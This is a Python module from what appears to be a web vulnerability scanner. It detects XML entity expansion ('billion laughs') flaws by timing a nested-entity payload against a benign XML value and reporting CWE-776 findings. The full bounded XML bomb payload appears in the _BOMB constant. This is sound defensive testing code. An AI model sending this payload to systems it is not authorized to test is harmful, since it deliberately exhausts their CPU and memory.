"""XML entity expansion ("billion laughs") — denial of service. CWE-776, OWASP A05:2021.

Injects a bounded nested-entity XML into the same body/JSON points XXE uses. A parser that expands
internal entities without limits spends seconds inflating a few bytes into megabytes; a hardened parser
(entity limits / DTD disabled) rejects it immediately. Confirmed by a **time differential**: the bomb
must be dramatically slower than a benign XML value, and it must reproduce — a value that isn't parsed
as XML causes no delay, so spraying it is false-positive-safe. Intrusive (it degrades the target on
purpose), so it is behind ``--test-dos`` and off in the ``quick`` profile.
"""

from __future__ import annotations

from urllib.parse import urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse
from dastcore.engine.injection_points import extract_injection_points
from dastcore.engine.rule_engine import build_mutated_request

_MAX_POINTS = 20
_THRESHOLD_MS = 800.0  # the bomb must add at least this much wall-clock time
_RATIO = 3.0  # ...and be at least this many times slower than a benign XML value
_BENIGN = '<?xml version="1.0"?><r>ok</r>'

# Bounded billion-laughs: 5 nested levels of 10x -> ~10^5 expansions of a 10-char string (~1MB),
# enough to stall an unbounded parser without a runaway explosion.
_BOMB = (
    '<?xml version="1.0"?><!DOCTYPE r ['
    '<!ENTITY a "dcdcdcdcdc">'
    '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
    '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
    '<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">'
    '<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">'
    "]><r>&e;</r>"
)


async def _timed(client: HttpClient, request: HttpRequest) -> float | None:
    try:
        response = await client.request(
            request.method,
            request.url,
            params=request.params or None,
            headers=request.headers or None,
            data=request.data,
            json=request.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None
    return response.elapsed_ms


def _slow(bomb_ms: float, base_ms: float) -> bool:
    return (bomb_ms - base_ms) >= _THRESHOLD_MS and bomb_ms >= _RATIO * max(base_ms, 1.0)


def _finding(point, request: HttpRequest, base_ms: float, bomb_ms: float) -> Finding:
    path = urlsplit(request.url).path or "/"
    return Finding(
        id=f"xml-entity-expansion:{request.method}:{path}:{point.location}:{point.name}",
        rule_id="xml-entity-expansion",
        name="XML entity expansion (billion laughs) — denegación de servicio",
        severity="high",
        cwe="CWE-776",
        owasp="A05:2021",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        family="dos",
        injection_point=point,
        evidence=[
            Evidence(
                type="time_based",
                data=(
                    f"una XML con entidades anidadas en '{point.name}' ({point.location}) tardó {bomb_ms:.0f}ms "
                    f"frente a {base_ms:.0f}ms de una XML benigna — el parser expande entidades internas sin límite "
                    "(billion laughs), agotando CPU/memoria"
                )[:200],
                confidence="high",
            )
        ],
        request=build_mutated_request(point, _BOMB),
        response=HttpResponse(status_code=0, elapsed_ms=bomb_ms),
        remediation=(
            "Limita la expansión de entidades y desactiva el procesamiento de DTD en el parser XML "
            "(FEATURE_SECURE_PROCESSING / disallow-doctype-decl). Rechaza documentos con DOCTYPE."
        ),
    )


async def run_xml_expansion_checks(client: HttpClient, requests: list[HttpRequest]) -> list[Finding]:
    """Time a nested-entity XML against a benign one on each body/JSON point; report reproducible stalls."""
    findings: list[Finding] = []
    seen: set[tuple[str, str, str]] = set()
    for request in requests:
        for point in extract_injection_points(request, include_headers=False):
            if point.location not in ("body", "json"):
                continue
            sig = (urlsplit(request.url).path or "/", point.location, point.name)
            if sig in seen:
                continue
            seen.add(sig)
            if len(seen) > _MAX_POINTS:
                return findings

            base = await _timed(client, build_mutated_request(point, _BENIGN))
            bomb = await _timed(client, build_mutated_request(point, _BOMB))
            if base is None or bomb is None or not _slow(bomb, base):
                continue
            base2 = await _timed(client, build_mutated_request(point, _BENIGN))
            bomb2 = await _timed(client, build_mutated_request(point, _BOMB))  # reproducible
            if base2 is not None and bomb2 is not None and _slow(bomb2, base2):
                findings.append(_finding(point, request, min(base, base2), max(bomb, bomb2)))
    return findings
